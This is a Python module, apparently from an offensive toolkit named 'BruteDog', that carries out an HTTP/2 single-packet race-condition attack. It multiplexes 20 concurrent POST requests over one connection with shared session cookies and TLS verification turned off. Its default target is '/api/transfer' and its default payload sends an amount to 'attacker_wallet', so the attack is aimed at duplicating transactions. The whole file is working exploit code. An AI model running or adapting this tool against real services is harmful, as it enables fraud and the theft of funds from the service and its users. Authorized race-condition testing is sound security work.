#!/usr/bin/env python3
"""
RACE_CONDITION.PY — High-Concurrency API Logic & Race Condition Fuzzing Engine (v7.0)
Features:
- Single-connection HTTP/2 stream multiplexing (True Single-Packet Concurrency)
- Persistent Session Pool & Shared Cookie Jar integration
- Eliminates TCP handshake queue jitter and network skew
- Zero-disk live terminal streaming
"""
import asyncio
import httpx
import json
import time
import sys
from urllib.parse import urlsplit
from modules.session_pool import PersistentSessionPool

REQUEST_TIMEOUT = 15.0

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

async def fire_single_packet_race_async(host, port, path, payload, secure, num_streams=20, cookies=None, headers=None, session_pool=None):
    """
    Pipes multiple concurrent HTTP/2 streams down a single socket connection using 
    a persistent session pool, forcing simultaneous server-side execution window 
    handling without TCP skew or session drops.
    """
    scheme = "https" if secure else "http"
    target_base = f"{scheme}://{host}:{port}" if port else f"{scheme}://{host}"
    target_url = f"{target_base}{path}"
    
    log(f"\n[***] INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ENGINE [***]", "\033[95m")
    log(f"[*] Firing {num_streams} simultaneous multiplexed streams against: {target_url}", "\033[94m")
    
    # Initialize or utilize the shared session pool for persistent cookies and headers
    if session_pool is None:
        session_pool = PersistentSessionPool(base_url=target_base, verify_ssl=False, http2=True)
    
    if cookies:
        session_pool.cookie_jar.update(cookies)
    
    if headers:
        session_pool.update_headers(headers)

    stream_override_headers = {
        "User-Agent": "BruteDog-RaceCondition/7.0",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
    }

    start_time = time.monotonic()
    results = []
    
    # Use the session pool's async client to ensure shared cookie/state persistence
    async with session_pool.get_async_client(timeout=REQUEST_TIMEOUT) as client:
        try:
            tasks = []
            for i in range(num_streams):
                req_headers = stream_override_headers.copy()
                req_headers["X-Race-Stream-ID"] = f"stream-{i}"
                
                # Dispatch task via HTTP/2 multiplexed client session
                task = client.post(
                    path, # Relative path works cleanly with base_url set in PersistentSessionPool
                    headers=req_headers,
                    json=payload
                )
                tasks.append(task)
            
            # Gather all responses atomically within the same connection window
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            elapsed = round(time.monotonic() - start_time, 3)
            
            status_tally = {}
            for idx, resp in enumerate(responses):
                if isinstance(resp, Exception):
                    results.append({"stream": idx, "status": 0, "body": str(resp), "elapsed": 0})
                else:
                    code = resp.status_code
                    status_tally[code] = status_tally.get(code, 0) + 1
                    results.append({
                        "stream": idx,
                        "status": code,
                        "body": resp.text[:1024],
                        "elapsed": elapsed
                    })
            
            success_count = sum(1 for r in results if r["status"] in (200, 201))
            log(f"[+] Concurrency test complete in {elapsed}s. Response distribution: {status_tally}", "\033[92m")
            log(f"[+] Parallel success responses: {success_count}/{num_streams}", "\033[92m")
            return results

        except Exception as exc:
            log(f"[-] HTTP/2 multiplexing critical error: {exc}", "\033[91m")
            return []

def run_race_condition_test(target_host, port=None, use_ssl=None, payload=None, cookies=None, headers=None, session_pool=None):
    """
    Synchronous wrapper matching your original runner interface, 
    upgraded to route through the centralized session pool with safe event-loop reuse.
    """
    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    host = parsed.hostname
    secure = parsed.scheme == "https" if use_ssl is None else use_ssl
    target_port = port or parsed.port
    base_path = parsed.path.rstrip("/")
    
    test_endpoint = base_path + "/api/transfer" if base_path else "/api/transfer"
    test_payload = payload or {"amount": 100, "recipient": "attacker_wallet"}
    
    coro = fire_single_packet_race_async(
        host=host,
        port=target_port,
        path=test_endpoint,
        payload=test_payload,
        secure=secure,
        num_streams=20,
        cookies=cookies,
        headers=headers,
        session_pool=session_pool
    )
    
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None

    if loop and loop.is_running():
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as pool:
            return pool.submit(asyncio.run, coro).result()
    else:
        return asyncio.run(coro)

